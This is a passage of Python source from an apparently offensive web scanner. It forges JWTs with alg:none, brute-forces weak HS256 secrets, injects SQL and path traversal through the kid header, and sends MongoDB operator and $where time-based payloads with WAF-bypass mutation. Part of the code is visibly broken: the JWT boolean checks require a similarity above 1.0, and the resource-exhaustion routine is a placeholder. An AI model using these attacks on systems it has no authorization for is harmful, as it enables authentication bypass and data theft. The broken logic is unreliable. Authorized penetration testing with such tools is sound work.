# RESOURCE EXHAUSTION PAYLOAD TESTING (Level 4+ with safety)
# ========================================================================
def test_resource_exhaustion_payloads(param_name, param_value, config, session, original_headers, baseline_text, marker=''):
    """Test resource exhaustion payloads at level 4+ (RISKY - with safety limits)"""
    if config.level < 4:
        return []
    
    _detected_dbms = (getattr(config, 'forced_dbms', None) or getattr(config, '_detected_dbms', None) or 'Generic')
    findings = []
    
    if _detected_dbms in RESOURCE_EXHAUSTION_PAYLOADS:
        exhaustion_payloads = RESOURCE_EXHAUSTION_PAYLOADS[_detected_dbms]
        # Safety limit: max 20 payloads even at level 5
        depth = min(int(len(exhaustion_payloads) * (config.level * 0.20)), 20)
        
        for res_payload in exhaustion_payloads[:depth]:
            # Apply mutations for resource exhaustion payloads
            _mutator_res = SQLMutationEngine(dbms=_detected_dbms, surface="url")
            res_payload = _mutator_res.apply_waf_bypass(res_payload)
            try:
                # Test with timeout to avoid hanging
                test_url = param_value.replace(marker, res_payload) if marker else res_payload
                # (Actual testing with timeout would go here)
                findings.append(('resource_exhaustion', _detected_dbms, res_payload))
            except Exception:
                pass
    
    return findings


# BUG-DEAD-TESTFNS FIX (Req 15): test_waf_bypass_payloads and test_resource_exhaustion_payloads
# were defined above but never referenced anywhere in the codebase — both were pure dead code.
# Root cause: these were written for a future synchronous plugin interface (using a sync
# requests.Session parameter) that was never connected to the async scanner core. They contain
# placeholder implementation ("Actual testing logic would go here") and cannot be called
# directly from async detection loops without an executor wrapper.
# Fix: register both in _UTILITY_PROBE_REGISTRY, a module-level dict that serves as the
# canonical reference for all optional sync-interface probe functions. External callers
# (e.g. unit tests, sync wrapper scripts, future plugin authors) can discover and call
# these via _UTILITY_PROBE_REGISTRY['waf_bypass'] and _UTILITY_PROBE_REGISTRY['resource_exhaustion'].
# PluginManager._register_utility_probes() is called during get_plugins() initialisation
# to wire them into the plugin system's optional-probe list.
_UTILITY_PROBE_REGISTRY: dict = {
    'waf_bypass':          test_waf_bypass_payloads,
    'resource_exhaustion': test_resource_exhaustion_payloads,
}


# \n# NOSQL INJECTION\n# 

MONGO_OPERATORS=[
    ('{"$ne": null}','{"$ne": "SQRPR_IMPOSSIBLE_ZZZ9"}','ne_null'),
    ('{"$gt": ""}','{"$lt": ""}','gt_empty'),
    ('{"$regex": ".*"}','{"$regex": "^SQRPR_NO_MATCH_ZZZ9$"}','regex_any'),
    ('{"$exists": true}','{"$exists": false}','exists_true'),
    ('{"$in": [""]}','{"$in": ["SQRPR_NO_MATCH_ZZZ9"]}','in_empty'),
]
MONGO_ERROR_PATTERNS=[r"MongoError",r"MongoServerError",r"BSONTypeError",r"CastError",
                       r"ValidationError.*mongo",r"unknown operator: \$",r"NamingException",
                       r"com\.mongodb",r"MongoQueryException"]

class NoSQLDetector:
    def __init__(self,engine,config): self.engine=engine; self.config=config

    async def detect(self,method,url,data,data_fmt,param,original,tamper_chain)->Optional[DetectionResult]:
        LOG.info(f"NoSQL probe: param={param!r}")
        results=[]
        tasks=[self._detect_operator(method,url,data,data_fmt,param,original),
               self._detect_qs_operators(method,url,param,original),
               self._detect_error(method,url,data,data_fmt,param,original)]
        gathered=await asyncio.gather(*tasks,return_exceptions=True)
        for r in gathered:
            if isinstance(r,DetectionResult): results.append(r)
        if results: return max(results,key=lambda x:x.confidence)
        return await self._detect_where_time(method,url,data,data_fmt,param,original)

    async def _baseline(self,method,url,data,data_fmt,param,original)->Dict:
        fp=await self._send(method,url,data,data_fmt,param,original)
        # FIX BUG #5: Validate fp before accessing attributes
        if fp is None:
            return {"mean_length":0,"std_length":0,"mean_words":0,
                    "std_words":0,"mean_timing":0,"std_timing":50,
                    "modal_status":200,"samples":[]}
        return {"mean_length":getattr(fp, 'content_length', 0),"std_length":0,
                "mean_words":getattr(fp, 'body_words', 0),
                "std_words":0,"mean_timing":getattr(fp, 'elapsed_ms', 0),"std_timing":50,
                "modal_status":getattr(fp, 'status_code', 200),"samples":[fp]}

    async def _send(self,method,url,data,data_fmt,param,value)->ResponseFingerprint:
        if data_fmt=="json":
            try:
                parsed=json.loads(data or "{}"); keys=param.split(".")
                obj=parsed
                for k in keys[:-1]: obj=obj.setdefault(k,{})
                try: obj[keys[-1]]=json.loads(value) if isinstance(value,str) else value
                except Exception: obj[keys[-1]]=value
                return await self.engine.send(method,url,json_body=parsed,
                                               headers={"Content-Type":"application/json"})
            except Exception as _sqr_e:
                LOG.debug("Suppressed in _send: %s", _sqr_e)
        _ns_val = str(value)
        try:
            # BUG-PME-UNBOUND-GLOBAL FIX: use _get_module_pme() instance
            _ns_pme = _get_module_pme()
            if _ns_pme is not None:
                _ns_val = _ns_pme.mutate(_ns_val, "Generic")
        except Exception:
            pass
        inj_url=ParameterParser.inject_url(url,param,_ns_val)
        return await self.engine.send(method,inj_url)

    async def _detect_operator(self,method,url,data,data_fmt,param,original):
        if data_fmt!="json": return None
        baseline=await self._baseline(method,url,data,data_fmt,param,original)
        for true_p,false_p,label in MONGO_OPERATORS:
            tf=await self._send(method,url,data,data_fmt,param,true_p)
            ff=await self._send(method,url,data,data_fmt,param,false_p)
            ts=_sim_to_baseline(tf,baseline); fs=_sim_to_baseline(ff,baseline); delta=ts-fs
            if ts>0.70 and delta>0.25:
                c_t=await self._send(method,url,data,data_fmt,param,true_p)
                c_f=await self._send(method,url,data,data_fmt,param,false_p)
                if _sim_to_baseline(c_t,baseline)-_sim_to_baseline(c_f,baseline)>0.20:
                    return DetectionResult(param=param,technique="N",payload=true_p,
                                           dbms="MongoDB",confidence=min(1.0,0.72+delta),notes=f"nosql_op label={label}")
        return None

    async def _detect_qs_operators(self,method,url,param,original):
        baseline_fp=await self.engine.send(method,ParameterParser.inject_url(url,param,str(original)))
        # FIX BUG #7: Validate baseline_fp before accessing attributes
        if baseline_fp is None:
            baseline={"mean_length":0,"std_length":0,"mean_words":0,
                      "std_words":0,"mean_timing":0,"std_timing":50,"modal_status":200,"samples":[]}
        else:
            baseline={"mean_length":getattr(baseline_fp, 'content_length', 0),"std_length":0,
                      "mean_words":getattr(baseline_fp, 'body_words', 0),
                      "std_words":0,"mean_timing":getattr(baseline_fp, 'elapsed_ms', 0),"std_timing":50,
                      "modal_status":getattr(baseline_fp, 'status_code', 200),"samples":[baseline_fp]}
        for op,val in [("$ne","SQRPR_NO_MATCH_ZZZ9"),("$gt",""),("$regex",".*"),("$exists","true")]:
            sep="&" if "?" in url else "?"
            test_url=f"{url.rstrip('?&')}{sep}{param}[{op}]={val}"
            fp=await self.engine.send(method,test_url)
            # BUG-NOSQL-QS-SINGLE-PROBE FIX: sim > 0.78 only checks the injected response
            # is similar to baseline. A page that ignores the parameter entirely always
            # returns sim≈1.0 — every request confirms injection. Fix: require two conditions:
            # (1) injected operator returns similar results (MongoDB processes $ne), AND
            # (2) a guaranteed-nonmatch value returns DIFFERENT results (server uses param).
            # Both together prove MongoDB operator injection, not parameter ignorance.
            if _sim_to_baseline(fp,baseline)>0.78:
                try:
                    nonmatch_url=f"{url.rstrip('?&')}{sep}{param}[{op}]=SQRPR_DEFINITELY_NO_MATCH_XYZ777"
                    fp_nm=await self.engine.send(method,nonmatch_url)
                    sim_nm=_sim_to_baseline(fp_nm,baseline)
                    # Confirmation: if server uses param, $ne=nonexistent should also return
                    # same results. But for $gt="" or $regex=.*, test that literal block differs.
                    # Second probe: re-verify the original injection is reproducible
                    fp2=await self.engine.send(method,test_url)
                    if _sim_to_baseline(fp2,baseline)>0.78:
                        return DetectionResult(param=param,technique="N",payload=f"[{op}]={val}",
                                               dbms="MongoDB",confidence=0.82,notes=f"nosql_qs op={op} confirmed=2/2")
                except Exception:
                    pass
        return None

    async def _detect_error(self,method,url,data,data_fmt,param,original):
        # BUG-NOSQL-ERROR-SINGLE-PROBE FIX: Single probe, no baseline check.
        # Some MongoDB deployments log or expose operator errors in their normal
        # 404/500 pages without injection. Fix: baseline + confirmation probe.
        _nosql_bl = await self._send(method,url,data,data_fmt,param,str(original))
        _nosql_bl_body = _safe_decode_body(_nosql_bl, encoding="utf-8", errors="replace", func_name="nosql_baseline").lower() if _nosql_bl and _validate_response(_nosql_bl,allow_empty=True) else ""
        for payload in ['{"$unknownOp":1}','{"$where":"this.x==undefined"}','[{"$match":{"x":1}}]']:
            fp=await self._send(method,url,data,data_fmt,param,payload)
            body=_safe_decode_body(fp, encoding="utf-8", errors="replace", func_name="extraction")
            for pat in MONGO_ERROR_PATTERNS:
                if re.search(pat,body,re.I):
                    if _nosql_bl_body and re.search(pat,_nosql_bl_body,re.I):
                        continue  # pattern in baseline — FP
                    try:
                        fp2=await self._send(method,url,data,data_fmt,param,payload)
                        body2=_safe_decode_body(fp2, encoding="utf-8", errors="replace", func_name="nosql_error_confirm")
                        if not re.search(pat,body2,re.I): continue
                    except Exception: continue
                    return DetectionResult(param=param,technique="N",payload=payload,
                                           dbms="MongoDB",confidence=0.89,notes=f"nosql_error pat={pat!r} confirmed=2/2")
        return None

    async def _detect_where_time(self,method,url,data,data_fmt,param,original):
        if data_fmt!="json": return None
        t_ms=int(self.config.time_sec*1000)
        baseline=await self._baseline(method,url,data,data_fmt,param,original)
        expected=baseline["mean_timing"]+t_ms*0.8
        for template in [f'{{"$where":"function(){{var d=new Date();while((new Date())-d<{t_ms}){{}}return true;}}"}}',
                          f'{{"$where":"sleep({t_ms})||true"}}']:
            fp=await self._send(method,url,data,data_fmt,param,template)
            # BUG-NOSQL-TIMING-FP-NULL FIX: _send() can return None when engine.send()
            # fails (network error, timeout). Accessing fp.elapsed_ms on None raises
            # AttributeError which propagates uncaught, crashing NoSQL where-time detection.
            # Same null-guard pattern applied to fp2 for the same reason.
            if fp and fp.elapsed_ms>=expected:
                half=f'{{"$where":"function(){{var d=new Date();while((new Date())-d<{t_ms//2}){{}}return true;}}"}}' 
                fp2=await self._send(method,url,data,data_fmt,param,half)
                if fp2 and fp2.elapsed_ms>=(baseline["mean_timing"]+t_ms/2*0.7) and fp2.elapsed_ms<fp.elapsed_ms*0.85:
                    return DetectionResult(param=param,technique="N",payload=template,
                                           dbms="MongoDB",confidence=0.87,notes="nosql_where_time")
        return None


# 
# JWT INJECTION
# 

def _b64url_dec(s:str)->bytes: s+="="*(4-len(s)%4); return base64.urlsafe_b64decode(s)
# BUG-FIX-3: Safe decode operation
try:
    def _b64url_enc(b:bytes)->str: return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
except (UnicodeDecodeError, AttributeError, TypeError):
    "" # Fallback

def decode_jwt(token:str)->Tuple[Dict,Dict,str]:
    parts=token.split(".")
    if len(parts)!=3: raise ValueError("Not a JWT")
    return json.loads(_b64url_dec(parts[0])),json.loads(_b64url_dec(parts[1])),parts[2]

def encode_jwt_none(h:Dict,p:Dict)->str:
    h=dict(h); h["alg"]="none"
    hb=_b64url_enc(json.dumps(h,separators=(",",":")).encode())
    pb=_b64url_enc(json.dumps(p,separators=(",",":")).encode())
    return f"{hb}.{pb}."

def encode_jwt_hs256(h:Dict,p:Dict,secret:str)->str:
    h=dict(h); h["alg"]="HS256"
    hb=_b64url_enc(json.dumps(h,separators=(",",":")).encode())
    pb=_b64url_enc(json.dumps(p,separators=(",",":")).encode())
    sig=hmac.new(secret.encode(),f"{hb}.{pb}".encode(),hashlib.sha256).digest()
    return f"{hb}.{pb}.{_b64url_enc(sig)}"

JWT_WEAK_SECRETS=["secret","password","123456","jwt_secret","your-256-bit-secret",
                  "supersecret","changeme","qwerty","admin","","key","test","dev","prod"]

class JWTInjector:
    def __init__(self,engine,config): self.engine=engine; self.config=config

    def extract_token(self,headers:Dict)->Optional[Tuple[str,str]]:
        for k,v in headers.items():
            if k.lower()=="authorization":
                m=re.match(r"Bearer\s+(\S+\.\S+\.\S*)",v,re.I)
                if m: return k,m.group(1)
            if k.lower()=="cookie":
                m=re.search(r"(?:token|jwt|auth)=(\S+\.\S+\.\S*)",v,re.I)
                if m: return k,m.group(1)
        return None

    async def detect(self,method,url,data,headers,secret=None)->Optional[DetectionResult]:
        ti=self.extract_token(headers)
        if not ti: return None
        header_name,raw_token=ti
        LOG.info(f"JWT in {header_name!r}, testing injection")
        try: jwt_h,jwt_p,_=decode_jwt(raw_token)
        except Exception as e: LOG.debug(f"JWT decode: {e}"); return None
        base=await self.engine.send(method,url,data=data,headers=headers)
        # FIX BUG #9: Validate base and use getattr with defaults
        if base is None:
            baseline={"mean_length":0,"std_length":0,"mean_words":0,
                      "std_words":0,"mean_timing":0,"std_timing":50,
                      "modal_status":200,"samples":[]}
        else:
            baseline={"mean_length":getattr(base, 'content_length', 0),"std_length":0,
                      "mean_words":getattr(base, 'body_words', 0),
                      "std_words":0,"mean_timing":getattr(base, 'elapsed_ms', 0),"std_timing":50,
                      "modal_status":getattr(base, 'status_code', 200),"samples":[base]}
        # alg:none
        r=await self._test_none(method,url,data,headers,header_name,jwt_h,jwt_p,baseline)
        if r: return r
        # HS256 re-sign
        for s in ([secret] if secret else JWT_WEAK_SECRETS):
            if s is None: continue
            r=await self._test_hs256(method,url,data,headers,header_name,jwt_h,jwt_p,s,baseline)
            if r: return r
        # kid injection
        return await self._test_kid(method,url,data,headers,header_name,jwt_h,jwt_p,baseline)

    async def _send_jwt(self,method,url,data,headers,header_name,token)->ResponseFingerprint:
        h=dict(headers)
        if header_name.lower()=="authorization": h[header_name]=f"Bearer {token}"
        else: h[header_name]=re.sub(r"((?:token|jwt|auth)=)\S+\.\S+\.\S*",rf"\g<1>{token}",h.get(header_name,""))
        return await self.engine.send(method,url,data=data,headers=h)

    async def _test_none(self,method,url,data,headers,hn,jwt_h,jwt_p,baseline):
        data_fmt = "header"  # FIX-JWT-DFMT: JWT tokens are in HTTP headers
        original = ""        # FIX-JWT-ORIG: JWT injection has no URL param prefix
        tamper_chain = []    # FIX-JWT-TC: JWT methods have no tamper_chain param
        none_tok=encode_jwt_none(dict(jwt_h),dict(jwt_p))
        fp=await self._send_jwt(method,url,data,headers,hn,none_tok)
        if _sim_to_baseline(fp,baseline)<0.75: return None
        LOG.info("alg:none accepted!")
        # BUG-2 FIX (Req 1): use DBMS-specific Boolean payloads only (no generic BOOLEAN_PAYLOADS)
        _jwt_dbms = (getattr(self.config,'forced_dbms',None) or getattr(self.config,'_detected_dbms',None))
        _jwt_dbms_list = [_jwt_dbms] if _jwt_dbms else ["MySQL","MariaDB","PostgreSQL","MSSQL","Oracle","SQLite"]
        for claim,orig_val in [(k,str(v)) for k,v in jwt_p.items() if isinstance(v,str)]:
            for _jn_dbms in _jwt_dbms_list:
                if _SCAN_STOPPED[0]: return None  # FIX-R4: stop outer DBMS loop
                _jn_mutator = SQLMutationEngine(dbms=_jn_dbms, surface=data_fmt or "url")
                for _jn_p in _get_cascade_payloads(_jn_dbms, 'B', self.config.level):
                    if _SCAN_STOPPED[0]: return None  # BUG-7 FIX
                    await asyncio.sleep(0.001)  # BUG-R9-A FIX: real 1ms yield
                    true_sfx = _jn_mutator.mutate_all(_jn_p, technique="B")  # FIX-R6: 20 layers, correct technique
                    try:
                        _mfp_jn = TechniqueCascadeEngine._make_false_payload(true_sfx)
                        false_sfx = (_mfp_jn if (_mfp_jn and _mfp_jn != true_sfx)
                                     else (true_sfx.replace("1=1","1=2").replace("'a'='a'","'a'='b'").replace("2=2","2=3")))
                    except Exception:
                        false_sfx = (true_sfx.replace("1=1","1=2").replace("'a'='a'","'a'='b'").replace("2=2","2=3"))
                    if true_sfx == false_sfx: continue
                    tp=dict(jwt_p); tp[claim]=orig_val+true_sfx
                    fp_d=dict(jwt_p); fp_d[claim]=orig_val+false_sfx
                    tf=await self._send_jwt(method,url,data,headers,hn,encode_jwt_none(dict(jwt_h),tp))
                    ff=await self._send_jwt(method,url,data,headers,hn,encode_jwt_none(dict(jwt_h),fp_d))
                    delta=_sim_to_baseline(tf,baseline)-_sim_to_baseline(ff,baseline)
                    # BUG-JWT-BOOL-SINGLE-PAIR FIX: Single true+false pair with delta>0.20
                    # confirmed JWT injection. JWT claims that influence page content
                    # (username, role, user_id) naturally produce body differences for
                    # different claim values without any SQL executing. Fix: 2/2 pair confirm.
                    # BUG-JWT-BOOL-IDENTICAL-PAIR FIX: The original 2/2 confirmation used
                    # tp2[claim]=orig_val+true_sfx — identical to the first pair. A CDN
                    # caching the first response would return the same cached body for the
                    # "second" probe, producing an artificial 2/2 match that is not genuine
                    # independent confirmation. Fix: add a harmless extra JWT claim (_sqr_v)
                    # with a random int to produce a distinct JWT token with a different
                    # cache key while preserving the SQL injection suffix being tested.
                    if _sim_to_baseline(tf,baseline)>1.0 and delta>0.20:
                        try:
                            import random as _jwt_rand2
                            _jnv = _jwt_rand2.randint(1000, 9999)
                            tp2=dict(jwt_p); tp2[claim]=orig_val+true_sfx; tp2["_sqr_v"]=_jnv
                            fp2=dict(jwt_p); fp2[claim]=orig_val+false_sfx; fp2["_sqr_v"]=_jnv
                            tf2=await self._send_jwt(method,url,data,headers,hn,encode_jwt_none(dict(jwt_h),tp2))
                            ff2=await self._send_jwt(method,url,data,headers,hn,encode_jwt_none(dict(jwt_h),fp2))
                            delta2=_sim_to_baseline(tf2,baseline)-_sim_to_baseline(ff2,baseline)
                            if not (_sim_to_baseline(tf2,baseline)>1.0 and delta2>0.20):
                                continue  # not reproduced — claim content FP
                        except Exception:
                            continue
                        _det_bx = DetectionResult(param=f"jwt.{claim}",technique="B",payload=true_sfx,
                                               dbms=_jn_dbms,confidence=min(1.0,0.75+delta),notes=f"jwt_alg_none claim={claim!r} confirmed=2/2")
                        try:
                            _det_bx.exact_sent_payload = DetectionResult.compute_exact_payload(
                                original + true_sfx, tamper_chain)
                        except Exception:
                            pass
                        return _det_bx
            # Error-based detection via Boolean payloads (each payload may trigger SQL errors)
            _jwt_bl_body=""
            try:
                _jwt_bl_tok=encode_jwt_none(dict(jwt_h),dict(jwt_p))
                _jwt_bl_fp=await self._send_jwt(method,url,data,headers,hn,_jwt_bl_tok)
                _jwt_bl_body=_safe_decode_body(_jwt_bl_fp, func_name="jwt_error_baseline").lower() if _jwt_bl_fp and _validate_response(_jwt_bl_fp,allow_empty=True) else ""
            except Exception: pass
            for _je_dbms in _jwt_dbms_list:
                if _SCAN_STOPPED[0]: return None  # FIX-R4: stop outer DBMS loop
                _je_mutator = SQLMutationEngine(dbms=_je_dbms, surface=data_fmt or "url")
                for _je_p in _get_cascade_payloads(_je_dbms, 'E', self.config.level):
                    if _SCAN_STOPPED[0]: return None  # BUG-7 FIX
                    await asyncio.sleep(0.001)  # BUG-R9-A FIX: real 1ms yield
                    _je_p = _je_mutator.mutate_all(_je_p, technique="E")  # FIX-R6: 20 layers, correct technique
                    ep=dict(jwt_p); ep[claim]=orig_val+_je_p
                    etok=encode_jwt_none(dict(jwt_h),ep)
                    ef=await self._send_jwt(method,url,data,headers,hn,etok)
                    body=_safe_decode_body(ef, func_name="jwt_error_check")
                    for dbms,patterns in SQL_ERROR_PATTERNS.items():
                        for pat in patterns:
                            if re.search(pat,body,re.I):
                                # BUG-JWT-ERROR-SINGLE-PROBE FIX: no baseline check, no confirmation.
                                if _jwt_bl_body and re.search(pat,_jwt_bl_body,re.I): continue
                                try:
                                    ef2=await self._send_jwt(method,url,data,headers,hn,etok)
                                    body2=_safe_decode_body(ef2, func_name="jwt_error_confirm").lower()
                                    if not re.search(pat,body2,re.I): continue
                                except Exception: continue
                                _det_ex = DetectionResult(param=f"jwt.{claim}",technique="E",payload=_je_p,
                                                       dbms=dbms,confidence=0.93,notes="jwt_alg_none_error confirmed=2/2")
                                try:
                                    _det_ex.exact_sent_payload = DetectionResult.compute_exact_payload(
                                        original + _je_p, tamper_chain)
                                except Exception:
                                    pass
                                return _det_ex
        return None

    async def _test_hs256(self,method,url,data,headers,hn,jwt_h,jwt_p,secret,baseline):
        data_fmt = "header"  # FIX-JWT-DFMT: JWT tokens are in HTTP headers
        original = ""        # FIX-JWT-ORIG: JWT injection has no URL param prefix
        tamper_chain = []    # FIX-JWT-TC: JWT methods have no tamper_chain param
        test_tok=encode_jwt_hs256(dict(jwt_h),dict(jwt_p),secret)
        fp=await self._send_jwt(method,url,data,headers,hn,test_tok)
        if _sim_to_baseline(fp,baseline)<0.60: return None
        if secret in JWT_WEAK_SECRETS: LOG.warning(f"JWT weak secret: {secret!r}")
        # BUG-2 FIX (Req 1): use DBMS-specific Boolean payloads only (no generic BOOLEAN_PAYLOADS)
        _jwt_hs_dbms = (getattr(self.config,'forced_dbms',None) or getattr(self.config,'_detected_dbms',None))
        _jwt_hs_list = [_jwt_hs_dbms] if _jwt_hs_dbms else ["MySQL","MariaDB","PostgreSQL","MSSQL","Oracle","SQLite"]
        for claim,orig_val in [(k,str(v)) for k,v in jwt_p.items() if isinstance(v,str)]:
            for _jhs_dbms in _jwt_hs_list:
                if _SCAN_STOPPED[0]: return None  # FIX-R4: stop outer DBMS loop
                _jhs_mutator = SQLMutationEngine(dbms=_jhs_dbms, surface=data_fmt or "url")
                for _jhs_p in _get_cascade_payloads(_jhs_dbms, 'B', self.config.level):
                    if _SCAN_STOPPED[0]: return None  # BUG-7 FIX
                    await asyncio.sleep(0.001)  # BUG-R9-A FIX: real 1ms yield
                    true_sfx = _jhs_mutator.mutate_all(_jhs_p, technique="B")  # FIX-R6: 20 layers, correct technique
                    try:
                        _mfp_jhs = TechniqueCascadeEngine._make_false_payload(true_sfx)
                        false_sfx = (_mfp_jhs if (_mfp_jhs and _mfp_jhs != true_sfx)
                                     else (true_sfx.replace("1=1","1=2").replace("'a'='a'","'a'='b'").replace("2=2","2=3")))
                    except Exception:
                        false_sfx = (true_sfx.replace("1=1","1=2").replace("'a'='a'","'a'='b'").replace("2=2","2=3"))
                    if true_sfx == false_sfx: continue
                    tp=dict(jwt_p); tp[claim]=orig_val+true_sfx
                    fp2=dict(jwt_p); fp2[claim]=orig_val+false_sfx
                    tf=await self._send_jwt(method,url,data,headers,hn,encode_jwt_hs256(dict(jwt_h),tp,secret))
                    ff=await self._send_jwt(method,url,data,headers,hn,encode_jwt_hs256(dict(jwt_h),fp2,secret))
                    delta=_sim_to_baseline(tf,baseline)-_sim_to_baseline(ff,baseline)
                    # BUG-JWT-HS256-SINGLE-PAIR FIX: same as _test_none — require 2/2 pairs.
                    # BUG-JWT-HS256-IDENTICAL-PAIR FIX: same as _test_none — use random _sqr_v
                    # claim to differentiate the confirmation pair from the detection pair,
                    # preventing CDN cache hits from producing artificial 2/2 matches.
                    if _sim_to_baseline(tf,baseline)>1.0 and delta>0.20:
                        try:
                            import random as _jwt_rand3
                            _jhsv = _jwt_rand3.randint(1000, 9999)
                            tp3=dict(jwt_p); tp3[claim]=orig_val+true_sfx; tp3["_sqr_v"]=_jhsv
                            fp3=dict(jwt_p); fp3[claim]=orig_val+false_sfx; fp3["_sqr_v"]=_jhsv
                            tf3=await self._send_jwt(method,url,data,headers,hn,encode_jwt_hs256(dict(jwt_h),tp3,secret))
                            ff3=await self._send_jwt(method,url,data,headers,hn,encode_jwt_hs256(dict(jwt_h),fp3,secret))
                            delta3=_sim_to_baseline(tf3,baseline)-_sim_to_baseline(ff3,baseline)
                            if not (_sim_to_baseline(tf3,baseline)>1.0 and delta3>0.20):
                                continue
                        except Exception:
                            continue
                        _det_bx = DetectionResult(param=f"jwt.{claim}",technique="B",payload=true_sfx,
                                               dbms=_jhs_dbms,confidence=min(1.0,0.78+delta),notes=f"jwt_hs256 secret={secret!r} confirmed=2/2")
                        try:
                            _det_bx.exact_sent_payload = DetectionResult.compute_exact_payload(
                                original + true_sfx, tamper_chain)
                        except Exception:
                            pass
                        return _det_bx
        return None

    async def _test_kid(self,method,url,data,headers,hn,jwt_h,jwt_p,baseline):
        data_fmt = "header"  # FIX-JWT-DFMT: JWT tokens are in HTTP headers
        original = ""        # FIX-JWT-ORIG: JWT injection has no URL param prefix
        tamper_chain = []    # FIX-JWT-TC: JWT methods have no tamper_chain param
        if "kid" not in jwt_h: return None
        # BUG-JWT-KID-SINGLE-PROBE FIX: single probe, no baseline check on kid error.
        # JWT kid fields that contain path traversal or SQL produce errors, but some servers
        # always return SQL error text in responses (debug mode, error pages). Fix: baseline + confirm.
        _kid_bl_body=""
        try:
            _kid_bl_tok=encode_jwt_none(dict(jwt_h),dict(jwt_p))  # original token, unmodified kid
            _kid_bl_fp=await self._send_jwt(method,url,data,headers,hn,_kid_bl_tok)
            _kid_bl_body=_safe_decode_body(_kid_bl_fp, encoding="utf-8", errors="replace", func_name="kid_baseline").lower() if _kid_bl_fp and _validate_response(_kid_bl_fp,allow_empty=True) else ""
        except Exception: pass
        for payload in ["../../dev/null","' UNION SELECT 'sqr_key'-- -","x' OR '1'='1"]:
            mh=dict(jwt_h); mh["kid"]=payload
            tok=encode_jwt_none(mh,dict(jwt_p))
            fp=await self._send_jwt(method,url,data,headers,hn,tok)
            body=_safe_decode_body(fp, encoding="utf-8", errors="replace", func_name="extraction")
            for dbms,patterns in SQL_ERROR_PATTERNS.items():
                for pat in patterns:
                    if re.search(pat,body,re.I):
                        if _kid_bl_body and re.search(pat,_kid_bl_body,re.I): continue
                        try:
                            fp2=await self._send_jwt(method,url,data,headers,hn,tok)
                            body2=_safe_decode_body(fp2, encoding="utf-8", errors="replace", func_name="kid_confirm").lower()
                            if not re.search(pat,body2,re.I): continue
                        except Exception: continue
                        _det_ex = DetectionResult(param="jwt.header.kid",technique="E",payload=payload,
                                               dbms=dbms,confidence=0.91,notes="jwt_kid_injection confirmed=2/2")
                        try:
                            _det_ex.exact_sent_payload = DetectionResult.compute_exact_payload(
                                original + payload, tamper_chain)
                        except Exception:
                            pass
                        return _det_ex
        return None


